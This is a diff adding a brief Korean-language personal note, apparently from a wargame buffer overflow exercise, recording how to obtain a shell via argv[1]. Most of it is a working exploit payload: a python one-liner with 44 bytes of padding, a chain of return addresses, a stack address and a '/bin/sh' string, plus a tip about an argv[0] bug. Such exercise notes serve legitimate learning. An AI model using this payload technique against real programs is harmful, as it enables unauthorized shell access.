@@ -1,0 +1,11 @@
+"/bin/sh"의 주소를 구해야됨 
+->환경변수 x
+->공유라이브러리 주소 x
+->sfp x
+
+argv[1]에 쑤셔 넣자
+0xbffffa68
+`python -c 'print "A"*44 + "\xec\x87\x04\x08" + "\xbc\x87\x04\x08" + "\x8c\x87\x04\x08" + "\x5c\x87\x04\x08" + "\x24\x87\x04\x08" + "XXXX" + "\xa8\xfa\xff\xbf" + "/bin/sh"'`
+
+argv[0]버그 있음
+파이썬 코드로 argv[0]을 강제로 없애면 작동함
